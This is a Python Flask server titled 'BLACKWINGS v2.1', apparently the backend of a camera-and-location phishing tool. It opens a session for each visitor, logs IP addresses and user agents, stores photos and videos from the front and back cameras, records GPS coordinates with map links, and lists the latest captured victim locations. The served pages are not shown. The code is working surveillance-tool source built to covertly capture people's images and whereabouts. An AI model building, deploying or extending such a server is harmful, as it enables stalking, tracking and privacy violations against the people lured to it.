#!/usr/bin/env python3
# BLACKWINGS v2.1 — camera & location capture server (Junmo)
import os, json, uuid, logging
from datetime import datetime
from flask import Flask, request, jsonify, render_template

BASE = os.path.dirname(os.path.abspath(__file__))
CAPTURES = os.path.join(BASE, 'captures')
os.makedirs(CAPTURES, exist_ok=True)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 300 * 1024 * 1024  # 300 MB
logging.getLogger('werkzeug').setLevel(logging.INFO)

def load_info(path):
    with open(os.path.join(path, 'info.json')) as f:
        return json.load(f)

def save_info(path, info):
    with open(os.path.join(path, 'info.json'), 'w') as f:
        json.dump(info, f, indent=2)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/map')
def map_page():
    return render_template('map.html')

@app.route('/session', methods=['POST'])
def create_session():
    sid = datetime.now().strftime('%Y%m%d_%H%M%S') + '_' + str(uuid.uuid4().int % 1000).zfill(3) + '_1'
    path = os.path.join(CAPTURES, sid)
    os.makedirs(path)
    info = {
        'session_id': sid,
        'timestamp': datetime.now().isoformat(),
        'ip': (request.headers.get('X-Forwarded-For') or request.remote_addr).split(',')[0].strip(),
        'user_agent': request.headers.get('User-Agent', ''),
        'videos': {'front': [], 'back': []},
        'photos': {'front': [], 'back': []},
        'location': None,
    }
    save_info(path, info)
    return jsonify({'ok': True, 'session_id': sid})

@app.route('/capture', methods=['POST'])
def capture():
    sid = request.form.get('session_id') or request.args.get('session_id')
    cam = request.form.get('cam', 'front')
    idx = request.form.get('index', '0')
    f = request.files.get('photo')
    if not sid or not f:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = os.path.join(CAPTURES, sid)
    if not os.path.isdir(path):
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    name = f"{cam}_{datetime.now().strftime('%H%M%S')}_{idx}.jpg"
    f.save(os.path.join(path, name))
    info = load_info(path)
    info['photos'][cam].append({'file': name, 'index': int(idx), 'ts': datetime.now().isoformat()})
    save_info(path, info)
    return jsonify({'ok': True, 'file': name})

@app.route('/upload', methods=['POST'])
def upload():
    sid = request.form.get('session_id') or request.args.get('session_id')
    cam = request.form.get('cam', 'front')
    f = request.files.get('video')
    if not sid or not f:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = os.path.join(CAPTURES, sid)
    if not os.path.isdir(path):
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    mime = f.mimetype or ''
    ext = '.mp4' if 'mp4' in mime else '.webm'
    name = f"{cam}_{datetime.now().strftime('%H%M%S')}_{uuid.uuid4().int % 1000}{ext}"
    f.save(os.path.join(path, name))
    info = load_info(path)
    info['videos'][cam].append({'file': name, 'size': os.path.getsize(os.path.join(path, name)),
                                'ts': datetime.now().isoformat()})
    save_info(path, info)
    return jsonify({'ok': True, 'file': name})

@app.route('/location', methods=['POST'])
def location():
    data = request.get_json(force=True, silent=True) or {}
    sid = data.get('session_id') or request.form.get('session_id')
    lat, lon, acc = data.get('lat'), data.get('lon'), data.get('accuracy')
    if not sid or lat is None or lon is None:
        return jsonify({'ok': False, 'error': 'missing fields'}), 400
    path = os.path.join(CAPTURES, sid)
    if not os.path.isdir(path):
        return jsonify({'ok': False, 'error': 'no such session'}), 404
    info = load_info(path)
    info['location'] = {'lat': float(lat), 'lon': float(lon), 'accuracy_m': float(acc or 0),
                        'google_maps': f"https://www.google.com/maps?q={lat},{lon}"}
    save_info(path, info)
    return jsonify({'ok': True})

@app.route('/location/latest')
def latest():
    out = []
    for sid in sorted(os.listdir(CAPTURES), reverse=True):
        p = os.path.join(CAPTURES, sid)
        try:
            info = load_info(p)
        except Exception:
            continue
        if info.get('location'):
            out.append({
                'session_id': sid,
                'lat': info['location']['lat'],
                'lon': info['location']['lon'],
                'accuracy_m': info['location']['accuracy_m'],
                'google_maps': info['location']['google_maps'],
                'photos': sum(len(v) for v in info['photos'].values()),
                'videos': sum(len(v) for v in info['videos'].values()),
                'timestamp': info.get('timestamp'),
            })
    return jsonify({'sessions': out})

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True)